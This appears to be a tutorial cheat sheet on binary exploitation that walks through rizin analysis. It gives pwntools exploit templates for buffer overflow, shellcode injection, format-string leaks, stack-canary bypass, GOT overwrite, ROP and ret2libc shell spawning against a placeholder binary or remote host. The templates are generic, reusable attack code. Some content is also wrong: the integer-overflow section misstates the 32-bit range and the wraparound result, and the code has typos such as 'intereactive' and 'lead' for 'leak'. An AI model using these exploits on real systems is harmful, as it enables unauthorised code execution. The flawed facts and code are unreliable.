---
title: Binary Exploitation
description: Binary Exploitation is the process of finding vulnerabilities in the binary file.
tags:
    - Reverse Engineering
refs:
date: 2023-01-23
draft: false
---

## Prerequisites

This post uses “rizin” for dynamic analysis.  
And “pwntools” python package is useful for binary exploitation.

<br />

## Investigation

### Security Properties

First check the executable properties.

```sh
checksec --file=.example
```

- **RELRO**

    - **Partial RELRO** - We can read/write the global offset table.
        
- **STACK CNARY**

    - **No canary found** - It’s vulnerable to buffer overflow.
        
- **NX**

    - **NX enabled** - We cannot execute custom shellcode from the stack.
        
- **PIE**

    - **No PIE** - The binary always starts at same address.

### ASLR (Address Space Layout Randomization) in Machine

ASLR is a security technique involved in preventing exploitation of memory corruption vulnerabilities.

```sh
cat /proc/sys/kernel/randomize_va_space
2
```

- **0** - The address space is NOT randomized.
- **1** - The address space is randomized.
- **2** - The address space is randomized, and data segment as well.

<br />

## Code Analysis

### 1. Start Debugger

```sh
# Change permission for debugging
chmod +x example

# -d: Debug mode
rizin -d example
```

### 2. Analyzing

```sh
# Analyze all calls, references, emulation and applies signatures
[0x0000]> aaa
```

### 3. List functions

```sh
# List functions
[0x0000]> afl
[0x0000]> afl | grep main
```

### 4. Disassemble & Decompile Functions

```sh
# Disassemble the function
[0x0000]> pdf @ main
[0x0000]> pd @ main
# Disassemble the first 50 lines
[0x0000]> pd 50 @ main

# Decompile the function (the ghidra plugin required)
[0x0000]> pdg @ main
```

If you want to decompile using “pdg” command as above, you need to install the “rizin-plugin-ghidra” so install it by running the following command.

```sh
sudo apt install rizin-plugin-ghidra
```

<br />

## Buffer Overflow using gets()

The gets() function in C is vulnerable to lead to overflow of buffer size.  
Run "pdf" or "pdg" command to check if the program uses gets().

```sh
rizin -d ./example
[0x0000]> aaa

# Disassemble the function
[0x0000]> pdf @ main
# An example result
call  sym.imp.gets  ; char *gets(char *s)

# Decompile the function
[0x0000]> pdg @ main
# An example result
int64_t var_4h;
sym.imp.gets(&var_4h);
```

So the file uses gets() as above, it may cause unexpected behavior.

### Exploitation

Abuse input/output by typing a lot of characters more than the program expects..

```sh
./example

Type something:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

### Exploitation using Pwntools

```python
from pwn import *

context.update(arch="amd64", os="linux")

payload = b"A" * 200

p = process('./example') # p = remote('example.com', '1337')
p.sendline(payload) # or p.send(payload + b"\n")
p.intereactive()
```

<br />

## Overwrite Variables

The program executes input/output by gets() or scanf(), and limit the buffer size of the variable, we can modify the variable then lead to unexpected behavior.  
For instance, assume the program is as follow.

```sh
rizin -d ./example
[0x0000]> aaa

# Disassemble the function
[0x0000]> pdf @ main
# An example result
sub   rsp, 0x70
call  sym.imp.__isoc99_scanf       ; int scanf(const char *format)
cmp   dword [rbp-0x4], 0xdeadbeef
jne   0x5569e8600992
lea   rdi, str.bin_sh              ; "/bin/sh"
ret
```

First find the distance from the stack pointer to rbp-0x4 (0x04).

```python
python3
>>> int(0x70-0x4)
108
```

### Exploitation using Pwntools

```python
from pwn import *

context.update(arch="amd64", os="linux")

payload = b"A" * 108
payload += p32(0xdeadbeef)

p = process('./example') # p = remote('example.com', '1337') for remote connection
p.sendline(payload)
p.interactive()
```

<br />

## Overwrite the Address of the Next Call

If the program uses get() or scanf(), we can specify the address of the desired calls by overwriting the address.

```sh
rizin -d ./example
[0x0000]> aaa

# List all functions
{0x0000]> afl
# An example result
0x0040158c  main
0x00401194  vuln_fn
```

For instance, if we want to call the “vuln_fn” function listed as above, and the program uses gets() or scanf(), we can specify the address of the next calls by overwriting the address.

```sh
# Add breakpoint to the main function
[0x0000]> db @ main
[0x0000]> dc
# Disassemble the first 50 lines (the number of lines is arbitrary)
[0x0000]> pd 50
[0x0000]> pd 50 @ main
[0x0000]> dc

Type somthing:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

### Exploitation using Pwntools

```python
from pwn import *

context.update(arch="amd64", os="linux")

elf = context.binary = ELF("./example")

payload = b"A" * 32
# Give the address of the desired function.
payload += p64(elf.sym["vuln_fn"])
# or if PIE is disabled, we can set the address directly.
# payload += p64(0x00401194)

p = process('./example') # p = remote('example.com', '1337') for remote connection.

p.sendline(payload)
p.interactive()
```

<br />

## Shellcode

We can create the crafted shell code and overwrite the address to execute the shell code.  
Use pwntools to create the shell code.

```python

from pwn import *

context.update(arch="amd64", os="linux")

payload = b"A" * 50 + b"B" * 8
payload += asm(shellcraft.sh())

p = process('./example') # p = remote('example.com', '1337') for remote connection
p.sendline(payload)
p.interactive()
```

<br />

## Integer Overflow

If the program processes integer values with input/output, we can abuse it by overflow of integer.  
The range of 32-bit integer is **-2147483647 to 2147483647**, so if we type the max value +1 in input for instance, the result is -1. This is because

```bash
./example

Type number:
>> 2147483648
The number you entered is -1.
```

<br />

## Format String (Pointer)

```sh
./example

Type something:
>> %2$p
The result is 0x555a18ae6365
```

### Exploitation Examples

```sh
# Brute force pointer
for i in {20..-1}; do echo \%$i\$p | ./example; done

# Brute force pointer & cut & hexdump (reverse) & reverse
# cut -c 15-: Select only N characters (e.g. 15 characters)
# xxd -ps: Output in plain hexdump style
# xxd -r: Reverse operation. Convert hexdump into binary
# rev: Reverse lines characterwise
(for i in {11..6..-1}; do echo \%$i\$p | ./example; done) | grep "The result is" | cut -c 15- | xxd -ps -r | rev
```

<br />

## Bypass Canary Protection

```python
from pwn import *
import re

context.update(arch="amd64", os="linux")

filepath = "./example"
elf = context.binary = ELF(filepath)

p = process(filepath) # p = remote('example.com', '1337') for remote connection

# We need to find the stack canary. This address ends with "00".
# To find it, execute p.sendline(b"%p %p %p %p ...").
p.sendline(b"%10$p %13$p")
p.recvuntil(b"result: ")
leaked = p.recvline().split()
print(leaked)
base = int(leaked[0], 16) - 0xa90
canary = int(leaked[1], 16)
elf.address = base

payload = b"A"*24
payload += p64(canary)
payload += b"B"*8
payload += p64(base + 0x6fe)
payload += p64(elf.sym["target_func"])

p.sendline(payload)
p.interactive()
```

<br />

## GOT Overwrite

GOT (Global Offset Table) is a section of a computer program’s memory used to enable computer program code compiled as an ELF file to run correctly.

```python
from pwn import *

context.update(arch="amd64", os="linux")

filepath = "./example"

elf = context.binary = ELF(filepath)

p = process(filepath)  # p = remote('example.com', '1337')

p.clean()
p.sendline()
p.clean()

payload = fmtstr_payload(10, {elf.got['puts'] : elf.sym['holidays']})
p.sendline(payload)
p.interactive()
```

<br />

## ROP

[ROPgadget](https://github.com/JonathanSalwan/ROPgadget) lets you search your gadgets on your binaries to facilitate your ROP exploitation.

```python
from pwn import *

context.update(arch="amd64", os="linux")

filepath = "./example"

p = process(filepath)
#p = remote('example.com', '1337')

payload = flat(
    b'A'*40,

    # Generated by `ROPgadget --binary example --ropchain`
    # Paste the output
)

p.clean()
p.sendline(payload)

p.interactive()
```

<br />

## ret2libc

### ASLR Bypass

First check the ASLR in the machine.

```bash
cat /proc/sys/kernel/randomize_va_space
```

If we get “2” as the result, the machine randomizes the address space so we cannot find the address of the system function. That’s why we need to bypass ASLR to find the address of the function in libc.

### Find the Leaf Function

1. Open Ghidra.
2. Go to Program Trees → <binary_name> → .got.plt
3. If we can find puts or printf function, we can abuse it.
4. Go to Program Trees → <binary_name> → .plt

### Exploit

```python
from pwn import *

context.binary = binary = './example'

elf = ELF(binary)
rop = ROP(binary)

# To find the path of the libc, run 'ldd <binary_name>'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process()

# Create ROP chain to find the address of the leaked function
offset = 16 # We need to find it first
padding = b'A'*offset
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)

p.recvline()
p.sendline(payload)
p.recvline()
# u64: Unpack the byte string
# ljust(8, b'\0'): Zero padding to 64 bits (8 bytes)
leak = u64(p.recvline().strip().ljust(8,b'\0'))
p.recvline()

log.info(f'Gets leak => {hex(lead)}')
libc.address = leak - libc.symbols.gets
log.info(f'Libc base => {hex(libc.address)}')

# Create ret2libc payload
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

# Send the payload
p.sendline(payload)
p.recvline()
p.interactive()
```

<br />

## ret2plt

Coming soon.